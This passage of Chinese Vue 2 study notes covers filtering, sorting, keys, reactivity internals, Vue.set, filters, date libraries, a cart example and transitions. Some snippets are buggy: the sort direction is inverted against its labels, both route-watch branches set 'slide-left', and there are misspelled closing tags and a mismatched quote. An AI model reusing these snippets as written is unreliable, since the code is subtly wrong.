- 空字符串的indexOf为  0
- 空字符串的includes为 true

<br>

我们将watch写成完全形式 并且传入配置项 immediate 为 true 一上来就会先执行一遍回调 这时候我们拿到的就是"" 拿着空串去过滤 会全部匹配 页面就会有值了
```js 
watch: {
  // 使用watch的完整形式
  info: {

    // 假如这个配置项 让它上来先执行一遍
    immediate:true,

    handler(n) {
      this.personsArr = this.persons.filter(item => {
        return item.name.indexOf(n) !== -1
      })
    }
  }
}
```

<br>

### 完整代码:
```html
<template>
  <div id="app">
    <ul>
      <li><input type="text" v-model="msg" /></li>

      <li 
        v-for="item of newPersons" 
        :key="item.id"
      >
        {{item.name}} -- {{item.age}}
      </li>
    </ul>
  </div>
</template>

<script>
  export default {
    name: 'App',
    data() {
      return {
        persons: [
          {id: '001', name: '马冬梅', age: 18},
          {id: '002', name: '周冬雨', age: 17},
          {id: '003', name: '周杰伦', age: 4},
          {id: '004', name: '温兆伦', age: 33},
        ],
        msg: "",
        newPersons: []
      }
    },
    watch: {
      msg: {
        immediate: true,
        handler(n) {
          this.newPersons = this.persons.filter(item => {
            return item.name.match(n) != null
          })
        }
      }
    }
  }
</script>
```

<br>

### computed实现:
计算属性中依赖了info 它会在两个时间点触发 
- 一个是一上来 
- 一个是依赖的info发生了变化它会重新计算 

也就是说 info 一旦发生改变 整个计算属性都会跟着变

我的想法是 计算属性 当有人读取计算属性的时候 它当中的getter方法会从一个地方得到值然后做展示 我们页面上使用 personsArr计算属性进行的遍历 相当于读取了它 它当中的getter就去某个地方拿出来 

我让它拿用户信息的元数据 persons 当然我们要拿的是 根据用户输入的信息 检索出来的结果

因为用户输入信息 info 一旦发生改变 计算属性中依赖了info info变 计算属性就会重新计算 页面就会根据计算属性的结果 重新渲染
```js 
computed: {
  personsArr() {
    return this.persons.filter(item => {
      return item.name.indexOf(this.info) !== -1
    })
  }
}
```

<br>

### 注意:
- 我们尽量不要操作元数据 可以创建一个新的空数据盛放搜索的结果
- str.match(val) 找到显示对应的数据 找不到为 null
- str.indexOf(val) 找到显示数据的下标 找不到为 -1 

**都可以判断内容是否含有指定值 但是 如果我们val 是 "" str的结果也是能找到 注意注意**

<br><br>

## 案例: 列表排序
我们对上面的例子添加一些功能 添加两个按钮 年龄升序 年龄降序 元顺序

- 点击 年龄升序 之后 页面的列表会按照年龄升序排列
- 点击 年龄降序 之后 同上

<br>

**注意:**  
新功能是上面的过滤是不分家的 比如 用户输入 周 会显示周杰伦 和 周冬雨 这时候我们点击排序就会对 周杰伦 和 周冬雨进行排序

<br>

### 思路: 
我们要知道用户点击按钮是 年龄升序 年龄降序 原顺序 所以我们要设置一个标识

- 原顺序    0
- 年龄降序  1
- 年龄升序  2

<br>

我们要设计一个变量用来存储用户要操作的类型是什么 sortType
```html 
<button @click='sortType=2'>年龄升序</button>
<button @click='sortType=1'>年龄降序</button>
<button @click='sortType=0'>原顺序</button>
```
```js
data() {
  return {
    sortType: 0  // 0原顺序 1降序 2升序
  }
}
```

<br>

因为我们的过滤和排序是不分家 页面渲染也是根据 personsList 这个计算属性来渲染的 所以我们要对 personsList 这个数据 进行排序
```js 
computed: {
  personsList() {

    // 这里我们不能着急的将结果返回 这么返回就是过滤后的结果 我们要再处理好排序的功能后再返回
    return this.persons.filter(item => {
      return item.name.indexOf(this.info) !== -1
    })
  }
},
```
```js
computed: {
  personsList() {
    const arr = this.persons.filter(item => {
      return item.name.indexOf(this.info) !== -1
    })

    // 判断一下是否需要排序 当sortType为0的时候就是false 不会走里面的逻辑 内部我们可以通过三元表达式来判断看看是不是1

    // 需要注意的是 我们是根据年龄来排序 我们要通过 a.age - b.age 的方式进行排序
    if(this.sortType) {
      arr.sort((a, b) => {
        return this.sortType === 1 ? a.age - b.age : b.age - a.age
      })
    }

    return arr
  }
},
```

<br>

### 注意: 
我们在使用 sort 的时候假如a 和 b是对象的情况下 要通过对象.的方式根据对象内部的属性来进行排序

<br><br>

# 组件的 :key 属性
key的作用就是给节点进行一个标识 相当于人类社会的身份证号 在将结构渲染到列表上的时候 标签属性中不会再出现key 因为这个key是vue在用的  

官方推荐我们再使用v-for时, 给对应的元素或组件添加一个 :key 属性 添加key属性的原因是和vue的虚拟DOM的diff算法有关系

当某一层有很多相同的节点时, 也就是列表节点时, 我们希望插入一个新的节点

```
A B C D E
```

我们希望可以在B 和 C之间添加一个F, diff算法默认执行起来是这样的 它会把C更新成F D更新成C E更新成D 最后再插入E, 是不是很没有效率

```
虚拟DOM     真实DOM
li1 > A     li1 > A
li2 > B     li2 > B

li6 > F

li3 > C     li3 > C
li4 > D     li4 > D
li5 > E     li5 > E
```

它会把3改成f 4改成c 5改成d 6创建e, 这样很笨的, 原来在中间插入就可以了, 但是它却是挨个替换  

所以需要使用key来给每一个节点做一个唯一标识 diff算法就可以正确的识别此节点, 找到正确的位置区插入新的节点, 所以一句话, key的作用主要是为了高效的更新虚拟DOM

<br>

### react vue中的key有什么用? 
key是虚拟dom对象的标识 当数据发生变化的时候 vue会根据 新数据 生成 新虚拟dom 随后vue进行 新虚拟dom 与 旧虚拟dom的差异比较 比较规则如下

<br>

**旧虚拟dom中找到了与新虚拟dom相同的key:**    
若虚拟dom中的内容没变 直接使用之前的真实dom 

若虚拟dom中的内容变了 则生成新的真实dom 随后替换掉页面中之前的真实dom

<br>

**旧虚拟dom中未找到与新虚拟dom相同的key:**  
创建新的真实dom 随后渲染到页面

<br>

**用index作为key可能会引发的问题:**    
若对数据进行 逆序添加 逆序删除等破坏顺序的操作 会产生没有必要的真实dom更新 界面没有问题但是效率低

若结构中还包含输入类的dom 会产生错误dom更新 界面有问题

<br><br>

# vue 监测对象数据 改变的原理
我们会在data中配置变量 当我们改变这个变量的时候 页面中应用到这个变量的地方就会发生改变
```js 
data: {
  name: 'sam'
  // 当发生改变的时候 页面用到name的地方也会自动发生变化
}

{{name}}
```

实现这些的原因就是我们修改了name被vue监测到了 那vue怎么知道name被修改了?  watch?    

vue里面默认就有一个监视 这个监视的作用就是当数据被改变的时候就自动更新用到这个数据的地方 而watch这个监视就vue交给程序员用的 但是无论是vue默认的监视 还是 交给程序员的watch底层原理都是一样的

<br>

我们要分析一下watch监测数据的原理 阐述之前我们先看看一个小例子
```html
<button @click='updateMei'> 更新马冬梅信息 </button>
  
<ul>
  <li v-for='(item, index) in persons' :key='item.id'>
    {{item.name}} -  {{item.age}}
  </li>
</ul>
```
```js
methods: {
  updateMei() {
    // this.persons[0].name = '马老师'    // 奏效
    // this.persons[0].age = 30          // 奏效

    // 整个 对象 都被 替换掉了
    this.persons[0] = {id: '001', name: '马老师', age: 30}
  }
}
```

马老师的对象被整个替换掉了 但是vue页面没有发生变化 从代码层面讲 是被修改了 但是 vue 并没有检测到  

上面的小例子中我们整体替换掉了数组中的一个对象 导致了页面并没有更新 

正常来讲我们修改了data中的数据 那么页面上用的该数据的地方就会自动更新 原因就是我们的修改 vue并没有监测到 那原因是什么呢? 

<br>

### vue是如何监测对象中的属性的改变的
```js 
data: {
  name: '尚硅谷',
  address: '北京'
}


<div>
  {{name}} - {{address}}
</div>
```

我们在data中定义的变量name address会在vm的身上也有一份 vm身上的name address都是来自于 _data中 _data中的数据 来自于我们传入的data配置项
```
data name address
```

在这之前还对data中的数据做了一些特殊的处理才放到了_data中
```
--- _data name address
  --- vm name address
  (使用defineproperty的getter从_data中获取的)
```

但是 vue 在将 data中的数据 复制一份到 _data之前还对数据做了一些的处理 这个特殊的处理就是我们要了解的部分  

我们打印一下 vm._data看看结果 我们只是在data中配置了name 和 address 但是在_data中 我们的数据变成了下面的样子 为什么呢? 

```js 
// _data 中的数据
{__ob__: Observer}
  address: (...)
  name: (...)
  __ob__: Observer {value: {…}, dep: Dep, vmCount: 1}
  get address: ƒ reactiveGetter()
  set address: ƒ reactiveSetter(newVal)
  get name: ƒ reactiveGetter()
  set name: ƒ reactiveSetter(newVal)
  [[Prototype]]: Object
```

我们在data中直接配置的是 name address 但是在._data中 name 和 address的值 给的不是那么直接了 必须要通过 getter 去拿 修改的时候要使用setter  

也就是说我们所谓的加工就是将我们传入的每一组kv 都加工成了getter 和 setter的样式  

正是因为加工这一下子就能做响应式了 比如我们修改了_data.name 那么就会引起setter的调用 vue在setter里面写了一个调用 它会重新的解析模板 生成虚拟dom 进行比较 渲染页面

<br>

### 简单的模拟下数据监测
我们有一组对象 当该对象的属性被修改的时候 我要输出一句话 该属性被修改了
```js 
let data = {
  name: 'sam',
  address: 'beijing'
}
```

先说下自己的思路 我想做一层数据代理 创建了一个空对象 使用Object.defineProperty方法在空对象当中添加name属性 name的属性值通过getter去data.name中获取 在setter中写当修改了name属性的时候我们输出逻辑

```js 
let middle = {}
Object.defineProperty(middle, 'name', {
  get() {
    console.log('data.name 被读取了')
    return data.name
  },

  set() {
    console.log('data.name 被设置了')
  }
})
```

老师带咱写的逻辑 首先定义了一个构造函数 在new 实例的时候传入 data对象

然后构造函数中接到data对象 开始遍历属性名 使用Object.defineProperty方法将属性名添加到obs实例对象上 然后设置了getter setter  

getter 当读取实例中的属性的时候 将data中的对应属性交出去  

setter 当设置属性的时候 我们去改变data中的对应属性 同时在setter中做更新页面的逻辑
```js 
let data = {
  name: 'sam',
  address: 'beijing'
}

// 创建一个监视的实例对象 用于监视data中属性的变化
const obs = new Observer(data)
console.log(obs);

let vm = {}
vm._data = obs

// 它的作用是创建一个监视的实例对象 接收一个对象作为参数
function Observer(obj) {
  // 汇总对象中所有的属性形成一个数组
  let keys = Object.keys(obj)

  // 遍历keys 利用Object.defineProperty方法 往this身上添加属性 this是上面的obs
  keys.forEach(key => {
    Object.defineProperty(this, key, {
      get() {
        return obj[key]
      },

      set(val) {
        obj[key] = val
      }
    })
  })
}
```

以上就是就是vue监测对象数据的原理

<br><br>

# Vue.set() API
有一种情况 比如我们在页面上展示了data中的一个students对象

```js
data: {
  student: {
    name: 'sam'
  }
}
```


我们展示了 姓名 性别 当有一天我们还想在页面中展示学生的年龄 怎么办?  

```js
// 上面的student对象中并没有 age
{{student.name}} -- {{student.age}}
```

<br>

我们可以往data中的学生对象中添加一个年龄的属性么?

```js 
vm._data.student.age = 18

{age: 18, __ob__: Observer}

  age: 18        // 它没对应的setter getter

  name: (...)
  __ob__: Observer {value: {…}, dep: Dep, vmCount: 0}
  get name: ƒ reactiveGetter()
  set name: ƒ reactiveSetter(newVal)
```

<br>

我们通过vm._data.student.age = 18 添加了年龄是18 但是我们发现 页面用到年龄的地方并没有更新  

而且我们发现通过这种方式添加进去的age 并不是 数据监视的状态 它虽然添加在vm身上了 但是因为不是数据监测的状态 就没办法做到响应式

因为我们这样添加进去的age 没有对应的getter 和 setter  

因为我们最开始在data中配置的数据 是在vue new的时候将data中的数据收集到了_data中 然后以_data中的数据做了数据代理放在了vm上 所以才能做到响应式的

<br>

**也就是说我们想用什么 当初一定要先在data配置项中配置好 这样的数据才是被监视的, 后期再往里添加的时候 想要做到响应式 就要使用 vue给我们提供的api**

<br>

### 丢失响应式的场景:
1. 对于数组: 当利用下标 删除 修改 数组的时候 这时我们修改的数据不是响应式的
2. 对于数组: 修改了数组的长度
3. 对于对象: 通过.的方法给data配置项中的对象添加属性的时候 这时的数据不是响应式的

<br>

### **<font color='#C2185B'>Vue.set(target, key, value)</font>**
使用该方法往对象中添加属性 也能做到响应式 该方式也可以修改数组身上的数据
```js  
Vue.set(this.arr, 1, "逛街“)
```  

<br>

**参数:**  
1. 要往谁的身上追加一个属性
2. 属性名
3. 属性值
```js
methods: {
  handleStudent() {
    Vue.set(this.student, 'age', 18)
  }
}
```

<br>

### **<font color='#C2185B'>vm.$set(target, key, value)</font>**
### **<font color='#C2185B'>this.$set(target, key, value)</font>**
和上面是一样的作用 注意 vm 就是this 也可以是this.$set()

<br>

**注意: api的第一个参数不能是vm 和 data**  
该方法只能给data里面的对象里面添加属性 而不是直接在data里面添加属性
```js 
data: {

  // vm.$set(student, age, 18) 这是可以的 因为它在给data里面的student对象里面添加属性
  student:{     
    name
  }
}


// vm.$set(data, leader, sam) 这会报错 不能直接给data里添加属性
leader: 
```

<br>

### **<font color='#C2185B'>this.$delete(target, key)</font>**
### **<font color='#C2185B'>Vue.delete(target, key)</font>**
移除一个响应式的数据

<br><br>

# Vue 监测 数组 数据改变的原理
我们上面知道 当我们在new vue的时候在data中的数据都会被添加数据监测后放到_data里面同时对_data中的数据做数据代理放到vm身上

那也就是说 每一个在data中的数据都会有一套为之对应的getter和setter

但是我们发现 我们试图找hobby数组的元素的时候 展开这个数组 并没有发现 里面元素的getter和setter

也就是说 vue并没有为数组里面的元素匹配一个getter 和 setter
```js 
data() {
  return {
    student: {
      name: 'sam',
      hobby: ['抽烟', '喝酒', '烫头']
    }
  } 
},


{__ob__: Observer}
  hobby: Array(3)
  0: "抽烟"
  1: "喝酒"
  2: "烫头"
  length: 3
  __ob__: Observer {value: Array(3), dep: Dep, vmCount: 0}
```

因为数组里面的你每一个元素并没有对应的getter 和 setter 那也就是说 我们通过数组的索引去改变这个数据的时候 vue是监测不到的 

也就是说数组里面的元素不是靠setter 和 getter来监视的
```js 
this.hobby[0] = 'haha'
// 这样的方式vue是监测不到的 不会引起页面的更新 
```

我们可以打开vm看看有没有setter 和 getter就知道了


<br>

那vue是怎么做的呢? 假如我们想修改下下面的数组 我们会用什么方法呢?
```js 
let arr = [1,3,5,7]

push
pop
shift
unshift
splice
sort
reverse
```

尤大大说了只有调了数组上的这些方法我才承认你修改了数组 **注意只有影响原数组的方式尤大大才会承认**
```js 
vm._data.student.hobby.pop()  // 这样操作的结果才能引起响应式
```

<br>

那vue怎么知道我们使用了push等这些方法的呢?

vue用了 包装技术 将 上述的数组上的方法进行了包装 也就是说我们看到的不再是数组原型上的供给数组使用的方法了 而被vue进行了包装 我们调用的是vue给我们提供的push

```js 
vm.data.student.hobby.push === Array.prototype.push   // false
```

<br>

也就是说我们沿着hobby的原型上找先找到的是vue给我们写的push vue在这个push中做了两件事情

1. 它先给你调用了正常数组上的push方法
2. 重新解析模板生成虚拟dom。。。

vue对数组的监测是靠包装数组原型上的方法实现的

我们还可以通过这个api来处理操作数组达到响应式的逻辑

<br><br>

# 过滤器 filters
过滤器的逻辑我们还可以用 methods 和 computed 都能实现 过滤器简单的理解为, 将数据 '过滤 / 格式下' 再显示在html结构中

```
比如我们可以过滤 时间, 数字, 后端传递过来的数据 
```

<br>

该方法能够接收到模板中 | 管道符号前面的数据 做为过滤器函数中的形参, 方法内部需要返回值

```
    →  →
 ↗        ↘
数据 | 过滤器方法
```

<br>

### 语法:
```js
{{value | 过滤器函数}}

filters: {
  过滤器函数(value, 任意参数) {
    return 函数内部需要返回值;
  }
}
```

**参数:**  
1. 管道符号前面的值
2. 向过滤器函数传入的参数

<br>

**返回值:**  
当解析的时候 过滤器函数的返回值 会替换掉 {{value | 过滤器函数}} 整个部分


```js 
// moment 
// 比如我们后端传递过来的数据 2019-11-19T04:32:46Z
filters: {
  format(val) {
    return moment(val).format("YYYY-MM-DD HH:SS");
  }
}

<div>{{this.detailList.update_time | format}}</div>


// day
<div>{{time | timeFormat}}</div>

filters: {
  timeFormat(time) {
    return dayjs(time).format('YYYY-MM-DD HH:mm:ss')
  }
}
```

<br>
 
### 应用场景:
使用一个过滤器 过滤不同风格的数据
```js 
<div>{{time | timeFormat('YYYY-MM-DD')}}</div>
    //2021-08-27


<div>{{time | timeFormat}}</div>
    // 2021-08-27 15:51:13


filters: {

  // 给了形参一个默认值
  timeFormat(time, str='YYYY-MM-DD HH:mm:ss') {
    return dayjs(time).format(str)
  }
}
```

<br>

### 多个过滤器之间可以串联
上面我们定义了一个格式化时间的 我们再定义一个保留字符串前4位的过滤器  

我们几个过滤器可以连续使用 第一个过滤器工作后的结果交给下一个过滤器 一层层传递
```js 
<div>{{time | timeFormat('YYYY-MM-DD') | strFormat}}</div>

filters: {

  // 格式化时间
  timeFormat(time, str='YYYY-MM-DD HH:mm:ss') {
    return dayjs(time).format(str)
  },

  // 字符串截取
  strFormat(val) {
    return val.substr(0,4)
  }
}
```

<br>

### 配置全局过滤器: 
### **<font color='#C2185B'>Vue.filter('过滤器的名字', fn)</font>**
参数: 注册过滤器的名字, 过滤器的处理函数
```js 
Vue.filter('strFormat', function() { })
```

<br>

### 技巧: 标签属性中也可以使用过滤器
过滤器不仅仅只能用在 插值语法 中 还可以使用在标签属性中  

我们使用v-bind绑定属性 这样引号里的部分就可以写表达式 就能应用 过滤器
```html 
<!-- <h3 x='你好呀 '> -->
<h3 :x='msg | strFormat'>测试文本</h3>  

<script>
data: {
  msg: '你好呀 尚硅谷'
}
</script>
```

<br><br>

# moment.js / day.js库
上两个时间的格式化库使用方式一样 只是后面的更加的轻量级
```s
https://cdn.bootcdn.net/ajax/libs/dayjs/1.10.6/dayjs.min.js
```

2022/09/18 moment.js已经停止维护

<br>

### moment基本用法:
只要我们引入了momentjs的库 全局就多了一个moment()函数

```js  
moment(要格式化的时间).format('MMMM Do YYYY, h:mm:ss a')
```

<br>

### dayjs基本用法:
只要我们引入了dayjs的库 全局就多了一个dayjs()函数
```js  
// 官网示例
dayjs(要格式化的时间)
  .startOf('month')
  .add(1, 'day')
  .set('year', 2018)
  .format('YYYY-MM-DD HH:mm:ss')
```

如果不传入要格式化的时间的话 会以当前时间做格式化

<br>

### Moment.js
时间格式化库的使用方式

1. 获取当前系统的时间
```js 
moment().format('YYYY-MM-DD HH:mm:ss')
```

2. 指定时间格式化
```js 
moment('1992-02-22 10:10:10').format('YYYY-MM-DD HH:mm:ss')

  // 或者

let date = moment('1992-02-22 10:10:10')
date.format('YYYY-MM-DD HH:mm:ss')
```

3. 查看10天之后是什么日期
```js 
let date = moment('1992-02-22 10:10:10')

// 看看10天之后
date.add(10, 'days').format('YYYY-MM-DD HH:mm:ss')
```

<br><br>

# 案例: 图书购物车

**根据数据动态生成行:**  
```js 
// 数据
data: {
  books: [
    {id:1,name:'算法导论',date:'2006-9',price:85.00,count:1},
    {id:2,name:'UNIX编程艺术',date:'2006-2',price: 59.00,count:1},
    {id:3,name:'编程珠玑',date:'2008-10',price:39.00, count:1},
    {id:4,name:'代码大全',date:'2006-3',price:128.00,count:1}
  ]
}
```

<br>

一般情况下 我们在制作的表格的时候 里面的内容都不是写死的, 而是从哪获取的数据动态的生成的表格, 这里我们要用v-for来遍历这个数组  

我们在tr上v-for 因为一本书就是一行, 对于每一行的单元格的遍历 我们有两种方式

<br>

### 方式1:
**我们并不推荐方式1** 因为这是整体把数据渲染到DOM结构中, 所以当想对元素做局部的调整的时候 很困难, 比如 我们在count前面添加- + 按钮, 比如给price价格的后面添加小数等等
```js 
<tr v-for='item in books'>
  <td v-for='value in item'>{{value}}</td>
</tr>
```

<br>

### 方式2:
在对tr使用v-for后 我们是item.属性的方式 手动创建td, 而不是利用循环创建td
```js 
<tr v-for='item in books'>
  <td>{{item.id}}</td>
  <td>{{item.name}}</td>
  <td>{{item.date}}</td>
  <td>{{item.price}}</td>
  <td><button>-</button><span>{{item.count}}</span><button>+</button></td>
  <td><button>移除</button></td>
</tr>
```

<br>

### 总结:
当我们要对局部的结构操作的时候 那么需要手动创建内部结构 然后依次填入数据 不要渲染整个tr结构 这样没办法操作td

<br><br>

## 过滤器案例: 保留两位小数, price前面添加符号的方法

### 方式1:
利用拼接, 缺点不灵活 很繁琐, 尤其是在需要修改的地方比较多的情况下, 另外, html代码的结构阅读起来也不够的清晰
```js 
<td>{{'$' + item.price.toFixed(2)}}</td>
```

<br>

### 方式2:
利用methods 在里面定义函数 我们在调用函数的时候, 把item.price作为参数传递了进来
```js 
<td>{{getFinalPrice(item.price)}}</td>

methods: {
  getFinalPrice(price) {
    return '$' + price.toFixed(2);
  }
},
```

<br>

### 方式3:
利用filters 在里面定义函数 它会把要过滤的东西作为参数传递到函数的里面
```js 
{{item.price | showPrice}}

filters: {
  showPrice(price) {
    return '$' + price.toFixed(2);
  }
}
```

<br><br>

## 案例总结: 点击按钮 操作count的加减

### 思路:
我们在methods中定义两个函数, 来控制按钮的点击 我们在点击按钮修改count的时候, 改的是对应书的count, 所以我们面临的第一个问题就是 我们要知道点了哪一本书  

我们就要在v-for遍历books的时候, (item, index) 把这个index 通过 @click='increment(index) 函数调用的方式传递给methods中的函数 

<br>

### 要点:
``:disabled='item.count <= 1'`` 下面还利用了 共同变量 index 即操作按钮也能操作数组
```html
  <button 
    @click='decrement(index)' 
    :disabled='item.count <= 1'>-</button>

  <button 
    @click='increment(index)'>+</button>

<script>
  methods: {
    decrement(index) {
      // 然后我们根据index就能取到点击的那本的count
      this.books[index].count--;
    },

    increment(index) {
      this.books[index].count++;
    }
  },
</script>
```

<br>

还有 我们在修改count的时候 不能为负数, 或者说不能小于1, 当<=1的时候 我们禁用按钮的点击功能, 当为true的时候 禁用按钮 既然后面是一个布尔值 我们可以通过如下的方式, 动态的修改是否禁用按钮

```
v-bind:disabled
```

```html
<button disabled = true / false>

<button 
  @click='decrement(index)' 
  :disabled='item.count <= 1'>-</button>
```

<br><br>

## 案例总结: 移除按钮 和 删除所有数据后 页面显示 购物车为空

### 购物车为空:
如果页面有数据(表内没删完)就显示表格内的数据, 当删完了就显示购物车为空

使用v-if v-else 我们在v-if中添加 books.length 因为表是通过data中的数组创建的, 所以清空数组后books.length的值为0 0转换为布尔值为false  

那么就说明 本身就有两个结构, 我们通过v-if v-else还决定显示哪个部分
```js 
<div v-if='books.length'>
  <table></table>
</div>

<h3 v-else>购物车为空</h3>
```

<br>

### 移除按钮:
在这里我们也要传递进来一个index 我们要知道我们移除的是哪个
```js 
removeHandle(index) {
  this.books.splice(index, 1);
}
```

<br>

### 总价格的部分
我们使用计算属性来做
```js 
<h3>总价格: {{totalPrice | showPrice}}</h3>

computed: {
  totalPrice() {
    let totalPrice = 0;
    for(let i=0; i<this.books.length; i++) {
      totalPrice += this.books[i].price * this.books[i].count;
    }
    return totalPrice;
  }
}
```

<br>

### 完整的代码部分:
```js 
const app = new Vue({
  el:'#app',
  data: {
    books: [
      {id:1, name:'算法导论', date:'2006-9', price:85.00, count:1},
      {id:2, name:'UNIX编程艺术', date:'2006-2', price: 59.00, count:1},
      {id:3, name:'编程珠玑', date:'2008-10', price:39.00, count:1},
      {id:4, name:'代码大全', date:'2006-3', price:128.00, count:1},
    ]
  },
  methods: {
    decrement(index) {
      this.books[index].count--;
    },
    increment(index) {
      this.books[index].count++;
    },

    removeHandle(index) {
      this.books.splice(index, 1);
    }
  },
  
  filters: {
    showPrice(price) {
      return '$' + price.toFixed(2);
    }
  },

  computed: {
    totalPrice() {
      let totalPrice = 0;
      for(let i=0; i<this.books.length; i++) {
        totalPrice += this.books[i].price * this.books[i].count;
      }
      return totalPrice;
    }
  }
})
```

<br><br>

# Vue 动画效果
操作 css 的 transition 或 animation vue 会给目标元素添加 / 移除特定的class 

<br>

### 使用动画的方式:
### 1. 定义一个动画
我们在组件内部定义一个动画 内部使用vue定义好的类名  

```
进入时候要激活的样式:  .v-enter-active
离开时候要激活的样式:  .v-leave-active
```

```css
.v-enter-active {
  animation: move 1s
}

.v-leave-active {
  animation: move 1s reverse
}

@keyframes move {
  from {
    transform: translateX(-100px)
  }
  to {
    transform: translateX(0px)
  }
}

/* 我们只要把两个类名 和 一个动画准备好 一包裹 完活 */
<transition>目标<transition>
```

<br>

### 2. 使用 ``<transition>`` 组件 将要发生动画的元素 包裹起来

**使用场景:**  
仿微信页面滑入滑出的效果, 我们使用 ``<transition>`` 组件将 ``<router-view>`` 包裹起来

```html
<transition>
  <router-view></router-view>
</transtion>
```

<br>

### Vue中过渡实现的原理:  
### **<font color="#C2185B">v-enter-active</font>**  
如果一个元素出现在屏幕上的话 比如我们父路由跳转到子路由 子路由出现在页面上(或者叫进入了视口)

这时候子路由这个页面就有相对应的3个类名

- v-enter: 元素刚进来的时间点
- v-enter-to: 元素进来结束的时间点
- v-enter-active: 在整个进来的过程中 都会存在的一个类名

```
            Enter

opacity: 0  --->  opacity: 1
    ↓                 ↓
 v-enter          v-enter-to
``` 

当我们给 transition 组件起上名字后 那就变成了
```
v-enter -> name-enter
```

<br>

### **<font color="#C2185B">v-leave-active</font>**  
离开和进入的类名都是一样的
```
            Leave

opacity: 1  --->  opacity: 0
    ↓                 ↓
 v-leave          v-leave-to
``` 

<br>

### 场景: 仿微信页面滑入滑出效果
当父路由跳转到子路由 子路由会从左滑入到视口  

我们给 transition组件上起个名字 slide-left 代表向左滑入
```html
<transition name="slide-left">
  <router-view></router-view>
</transtion>
```

<br>

那我们思考下 子页面向左滑入页面后 会有什么样的变化:  
对于父页面而言 子页面向左滑入视口 父页面从视口向左滑出

```
-100%   0   100%

      父页面 
        ←
 left:0 ~ left: -100% 


      子页面
        ←
 left:100% ~ left: 0
```

```css
/* 父页面 */
.slide-left-leave {
  /* 刚开始离开的时间点 */
  transform: translateX(0)
}

.slide-left-leave-to {
  /* 结束的时间点 就应该在-100% */
  transform: translateX(-100%)
}
```

上面是对于 父页面 的变化 父页面是离开  
对于子页面而言 子页面应该是从 100% ~ 0 的位置 子页面是进入

```css
/* 子页面 */
.slide-left-enter {
  /* 刚开始进入的时间点 */
  transform: translateX(100%)
}

.slide-left-enter-to {
  /* 结束的时间点 就应该在-100% */
  transform: translateX(0%)
}
```

然后我们要在 .slide-left-leave-active 类里面一直要监听 css 属性变化的
```css
.slide-left-leave-active,
.slide-left-enter-active {
  transition: all, 0.5s;

  /* 在子路由进入的时候 会发生错位空白的现象 所以我们可以这么设置 */
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
}
```

上面完成了子页面左滑入 父页面左滑出的效果

<br>

当我们返回父页面的时候 我们希望的是 父页面右滑入 子页面右滑出 所以我们可以给 transition 组件 添加一个名字
```html
<transition name="slide-right">
  <router-view></router-view>
</transtion>
```

<br>

**那我们就有两种情况了:**    
- 子页面左滑入的时候 使用的是 name="slide-left"  
- 子页面右滑出的时候 使用的是 name="silde-right"

<br>

**那么我们应该怎么操作?**   
我们可以使用 watch 监听路由的变化 我们可以在 路由的 meta 属性里面定义 是父页面还是子页面

```js
const routes = [
  {
    path: "/",
    name: "parent",
    component: Parent,
    meta: {
      // 父页面我们用 0 来表示
      index: 0
    }
  },
  {
    path: "/child",
    name: "child",
    component: Child,
    meta: {
      // 子页面我们用 1 来表示
      index: 1
    }
  }
]

data() {
  return {
    slideName: ""
  }
},
watch: {
  $route(to, from) {
    // 判断
    if(to.meta.index > from.meta.index) {
      // 说明是当前是父页面 子页面要进来 所以 slideName 应该是 slide-left
      // 父 -> 子
      this.slideName = "slide-left"
    } else {
      // 子 -> 父
      this.slideName = "slide-left"
    }
  }
}
```

<br>

最后我们这么修改下:
```html
<transition :name="slideName">
  <router-view></router-view>
</transtion>
```

<br>

### ``<transition>``组件的使用方式:
我们看看谁要做动画 谁做动画就用 ``<transition>目标<transition>`` 进行包裹
```js 
// 然后我们通过 isShow 属性 控制元素的显示和隐藏看看能不能触发过渡的效果
<transition>
  <h1 v-show='isShow'>你好啊</h1>
<transition>
```

<br>

**属性:** 
```html  
<transition name='任意名字'> 
```

<br>

**应用场景:**   
当页面上有多个元素需要过渡或者动画的时候 要写上各自的名字  
如果我们给标签起名字了 那么 css样式的里就不能使用默认的v-了要改成下面的样式
```css 
.v-enter-active { }
.任意名字-enter-active { }
```

<br>

### ``<transition>``组件的标签属性:
```html
<transition :appear='true'>
```
一上来先自动播放次动画

<br>

### 总结:
``<transition>`` vue在解析的时候会将这个标签脱掉

<br>

### 过渡的使用方式:
我们先准备好两个样式 

一个元素从没有在我们的视线 出现在 我们的视线 这个过程叫做来
在这个来的过程当中 vue在目标元素上加了3个类名

```s
.hello-enter - 进入的起点  相当于 动画里面的from
.hello-enter-to - 进入的终点  相当于 动画里面的to
.hello-enter-active - 过程中


.hello-leave - 离开的起点  相当于 动画里面的from
.hello-leave-to - 离开的终点  相当于 动画里面的to
.hello-enter-active - 过程中
```

<br>

使用 ``<transition name='hello'>`` 标签对元素进行包裹
定义进入 和 离开时候的样式 注意进入要有 from 和 to

```html
  <transition name='hello'>
    <h1 v-show='isShow'>你好啊</h1>
  <transition>
```
```css
  h1 {
    /* 我们可以不在这里写这个过渡 */
    transition: 0.5s    
  }
  

  /* 进入时候的过渡动画 */
  .hello-enter {
    transform: translateX(-100px)
  }

  .hello-leave-to {
    transform: translateX(0px)
  }

  /* 我们在这里面写也一样 */
  .hello-enter-active {
    transition: 0.5s
  }


  /* 离开时候的过渡动画 */
  .hello-leave {
    transform: translateX(0px)
  }

  .hello-leave-to {
    transform: translateX(-100px)
  }
```

<br>

### ``<transition-group>``的使用方式
多个元素使用过渡的时候可以这样, 使用方式和 
``<transition>``是一样的

使用 ``<transition-group>`` 对多个元素进行包裹 内部每一个元素要有key值 里面的元素都是一个过渡动画

```js 
<transition-group>
  <h1 v-show='isShow' key='1'>你好啊</h1>
  <h1 v-show='isShow' key='2'>你好啊</h1>
</transition-group>
```

以前我们学习的``<transition>``是用过渡单个元素的 当我们要过渡多个元素的时候 就要使用该组件 ``<transition-group>``

比如我们要对整个列表进行过渡 v-for循环一个列表的时候就可以使用它

<br>

### ``<transition-group>``的特点
**``<transition-group tag="section">`` tag标签属性:**  
```html
<transition-group>
  <!-- 使用transition-group一定要加上key -->
  <div class="item" :key="index" v-for="(item,index) of list">
    {{item}}
  </div>
</transition-group>
```

<br>

默认情况下 渲染transition-group里面的结构时候 不会将里面的元素结构进行包裹 如果将把元素结构渲染在一个 ``<section>`` 结构中可以使用 tag 标签属性

```html
<!-- 这样里面的结构就会被section包裹 -->
<transition-group tag="section">
```

<br>

- 过渡模式不可用 因为我们不再相互切换特有的元素
- 内部元素总是要提供唯一的 key 
- css过渡的类将会应用在内部的元素中 而不是这个容器本身

<br>

### 示例:
